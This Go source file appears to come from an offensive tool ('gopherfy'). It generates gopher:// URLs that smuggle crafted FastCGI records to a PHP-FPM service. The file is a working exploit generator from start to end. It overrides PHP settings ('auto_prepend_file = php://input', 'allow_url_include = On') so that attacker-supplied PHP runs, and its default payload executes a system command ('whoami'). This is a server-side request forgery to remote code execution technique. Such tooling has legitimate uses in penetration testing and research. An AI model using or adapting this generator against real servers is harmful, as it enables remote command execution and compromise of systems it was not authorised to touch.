package fastcgi

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"strings"

	"github.com/hupe1980/gopherfy/internal"
)

const (
	DefaultAddr = "127.0.0.1:9000"
	DefaultFile = "/usr/local/lib/php/System.php"
	DefaultCode = "<?php system('whoami'); exit; ?>"
)

type Options struct {
	Addr string
	File string
	Code string
}

type FastCGI struct {
	addr      string
	file      string
	code      string
	version   uint8
	reqID     uint16
	keepAlive byte
	buf       *bytes.Buffer
}

func NewFastCGI(optFns ...func(o *Options)) *FastCGI {
	options := Options{
		Addr: DefaultAddr,
		File: DefaultFile,
		Code: DefaultCode,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &FastCGI{
		addr:      strings.TrimSpace(options.Addr),
		file:      strings.TrimSpace(options.File),
		code:      strings.TrimSpace(options.Code),
		version:   1,
		reqID:     0x6857,
		keepAlive: 1, // keep alive
		buf:       new(bytes.Buffer),
	}
}

func (cgi *FastCGI) Payload() string {
	if err := cgi.beginRequest(); err != nil {
		panic(err)
	}

	if err := cgi.paramsRecord(); err != nil {
		panic(err)
	}

	if err := cgi.stdinRecord(); err != nil {
		panic(err)
	}

	payload := fmt.Sprintf("%x", cgi.buf.Bytes())

	payload = fmt.Sprintf("%%%s", internal.InsertNth(payload, '%', 2))

	return fmt.Sprintf("gopher://%s/_%s", cgi.addr, payload)
}

func (cgi *FastCGI) beginRequest() error {
	b := [8]byte{byte(RoleResponder >> 8), cgi.keepAlive, byte(0x00)}
	return cgi.writeRecord(typeBeginRequest, b[:])
}

func (cgi *FastCGI) paramsRecord() error {
	documentRoot := "/"

	params := internal.NewInsertionOrderMap()
	params.Set("GATEWAY_INTERFACE", "FastCGI/1.0")
	params.Set("REQUEST_METHOD", "POST")
	params.Set("SCRIPT_FILENAME", fmt.Sprintf("%s%s", documentRoot, strings.TrimLeft(cgi.file, "/")))
	params.Set("SCRIPT_NAME", cgi.file)
	params.Set("QUERY_STRING", "")
	params.Set("REQUEST_URI", cgi.file)
	params.Set("DOCUMENT_ROOT", documentRoot)
	params.Set("SERVER_SOFTWARE", "php/fcgiclient")
	params.Set("REMOTE_ADDR", "127.0.0.1")
	params.Set("REMOTE_PORT", "9985")
	params.Set("SERVER_ADDR", "127.0.0.1")
	params.Set("SERVER_PORT", "80")
	params.Set("SERVER_NAME", "localhost")
	params.Set("SERVER_PROTOCOL", "HTTP/1.1")
	params.Set("CONTENT_TYPE", "application/text")
	params.Set("CONTENT_LENGTH", fmt.Sprintf("%d", len(cgi.code)))
	params.Set("PHP_VALUE", "auto_prepend_file = php://input")
	params.Set("PHP_ADMIN_VALUE", "allow_url_include = On")

	return cgi.writePairs(typeParams, params)
}

func (cgi *FastCGI) stdinRecord() error {
	return cgi.writeRecord(typeStdin, []byte(cgi.code))
}

const (
	maxWrite = 6553500 // maximum record body
	maxPad   = 255
)

type header struct {
	Version       uint8
	Type          recType
	ID            uint16
	ContentLength uint16
	PaddingLength uint8
	Reserved      uint8
}

func (cgi *FastCGI) writeRecord(recType recType, content []byte) error {
	l := len(content)

	h := header{
		Version:       cgi.version,
		Type:          recType,
		ID:            cgi.reqID,
		ContentLength: uint16(l),
		PaddingLength: uint8(-l & 7),
	}

	if err := binary.Write(cgi.buf, binary.BigEndian, h); err != nil {
		return err
	}

	if _, err := cgi.buf.Write(content); err != nil {
		return err
	}

	pad := make([]byte, h.PaddingLength)
	if _, err := cgi.buf.Write(pad); err != nil {
		return err
	}

	return nil
}

func (cgi *FastCGI) writePairs(recType recType, pairs *internal.InsertionOrderMap) error {
	w := newWriter(cgi, recType)

	b := make([]byte, 8)

	for _, k := range pairs.Keys() {
		v, found := pairs.Get(k)
		if !found {
			return fmt.Errorf("cannot find value for key %s", k)
		}

		n := encodeSize(b, uint32(len(k)))
		n += encodeSize(b[n:], uint32(len(v)))

		if _, err := w.Write(b[:n]); err != nil {
			return err
		}

		if _, err := w.WriteString(k); err != nil {
			return err
		}

		if _, err := w.WriteString(v); err != nil {
			return err
		}
	}

	return w.Close()
}

type bufWriter struct {
	closer io.Closer
	*bufio.Writer
}

func newWriter(cgi *FastCGI, recType recType) *bufWriter {
	s := &streamWriter{cgi: cgi, recType: recType}
	w := bufio.NewWriterSize(s, maxWrite)

	return &bufWriter{s, w}
}

func (w *bufWriter) Close() error {
	if err := w.Writer.Flush(); err != nil {
		w.closer.Close()
		return err
	}

	return w.closer.Close()
}

type streamWriter struct {
	cgi     *FastCGI
	recType recType
}

func (w *streamWriter) Write(p []byte) (int, error) {
	nn := 0

	for len(p) > 0 {
		n := len(p)
		if n > maxWrite {
			n = maxWrite
		}

		if err := w.cgi.writeRecord(w.recType, p[:n]); err != nil {
			return nn, err
		}

		nn += n
		p = p[n:]
	}

	return nn, nil
}

func (w *streamWriter) Close() error {
	// send empty record to close the stream
	return w.cgi.writeRecord(w.recType, nil)
}

func encodeSize(b []byte, size uint32) int {
	if size > 127 {
		size |= 1 << 31
		binary.BigEndian.PutUint32(b, size)

		return 4
	}

	b[0] = byte(size)

	return 1
}
